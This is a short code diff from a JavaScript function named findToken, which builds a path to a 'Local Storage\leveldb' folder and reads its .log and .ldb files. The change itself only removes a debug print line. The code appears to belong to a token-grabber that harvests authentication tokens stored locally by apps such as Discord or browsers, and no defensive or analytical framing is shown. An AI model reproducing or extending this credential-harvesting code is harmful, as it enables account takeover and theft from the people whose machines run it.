@@ -4,7 +4,7 @@ function findToken(tokenPath) {
     tokenPath += "\\Local Storage\\leveldb";
 
     let tokens = [];
-console.log(tokenPath)
+
     try {
         fs.readdirSync(path.normalize(tokenPath)).map(file => {
             if (file.endsWith(".log") || file.endsWith(".ldb")) {
